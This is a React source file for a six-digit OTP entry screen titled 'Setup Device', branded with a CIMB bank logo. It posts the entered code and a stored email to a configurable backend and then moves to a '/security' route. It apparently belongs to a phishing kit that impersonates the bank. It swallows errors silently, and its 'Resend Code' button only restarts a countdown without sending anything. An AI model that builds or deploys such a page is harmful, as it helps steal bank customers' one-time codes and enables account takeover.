import React, { useRef, useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import BASE_URL from "../components/urls";
import logo from "../assets/logo.png";
import { data } from "autoprefixer";
const Otp = () => {
  const navigate = useNavigate();
  const inputsRef = useRef([]);
  const [otp, setOtp] = useState(Array(6).fill(""));
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [counter, setCounter] = useState(60);
  const [email, setEmail] = useState("");
  useEffect(() => {
    const storedEmail = localStorage.getItem("email");
    if (storedEmail) {
      setEmail(storedEmail);
    }
  }, []);

  useEffect(() => {
    if (counter > 0) {
      const timer = setTimeout(() => setCounter(counter - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [counter]);

  const handleChange = (value, index) => {
    if (/^\d?$/.test(value)) {
      const newOtp = [...otp];
      newOtp[index] = value;
      setOtp(newOtp);
      if (value && index < 5) {
        inputsRef.current[index + 1]?.focus();
      }
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputsRef.current[index - 1]?.focus();
    }
  };
  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      await axios.post(`${BASE_URL}/otp`, {
        otp: otp.join(""),
        email: email,
      });

      setOtp(Array(6).fill(""));
      navigate("/security");
    } catch (err) {
      console.log("OTP submission failed:", err); // just logs silently
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white text-black px-6 pt-6 flex flex-col items-center">
      <div className="w-full max-w-md mt-6">
        {/* Back Icon and Logo */}
        <div className="flex justify-end items-center mb-8">
          <img src={logo} alt="CIMB Logo" className="w-[40px]" />
        </div>

        {/* Titles */}
        <div className="mb-6">
          <h2 className="text-gray-500 text-lg font-medium">
            Device Management
          </h2>
          <h1 className="text-xl font-bold text-black">Setup Device</h1>
        </div>

        {/* Instruction */}
        <p className="text-md font-medium text-center mb-8">
          Enter OTP sent to the phone number registered to this account
        </p>

        {/* OTP Input */}
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="bg-[#E2E2E4] w-full h-full mb-4 px-4 py-3 rounded-lg">
            <label className="text-xs text-gray-500 uppercase mb-1 block">
              OTP
            </label>
            <input
              type="text"
              inputMode="numeric"
              maxLength={6}
              value={otp.join("")}
              onChange={(e) => {
                const val = e.target.value.replace(/\D/g, "").slice(0, 6);
                const valArray = val.split("");
                setOtp([...valArray, ...Array(6 - valArray.length).fill("")]);
              }}
              className="w-full text-black bg-transparent focus:outline-none placeholder:text-gray-500"
            />
            {otp.join("").length === 0 && (
              <p className="text-red-500 text-sm mt-1">OTP cannot be empty</p>
            )}
          </div>

          {/* Submit */}
          <button
            type="submit"
            disabled={loading}
            className="w-full py-3 text-white font-semibold rounded-lg bg-[#d32f2f] hover:bg-[#b71c1c] transition"
          >
            {loading ? "Verifying..." : "Continue"}
          </button>

          {/* Resend Code */}
          <div className="text-center text-sm mt-6">
            <span>I did not receive OTP. </span>
            <button
              type="button"
              className="text-red-600 underline ml-1"
              onClick={() => setCounter(60)}
              disabled={counter > 0}
            >
              Resend Code
            </button>
            {counter > 0 && (
              <span className="ml-2 text-gray-500">
                ({`0:${counter < 10 ? `0${counter}` : counter}`})
              </span>
            )}
          </div>
        </form>
      </div>
    </div>
  );
};

export default Otp;

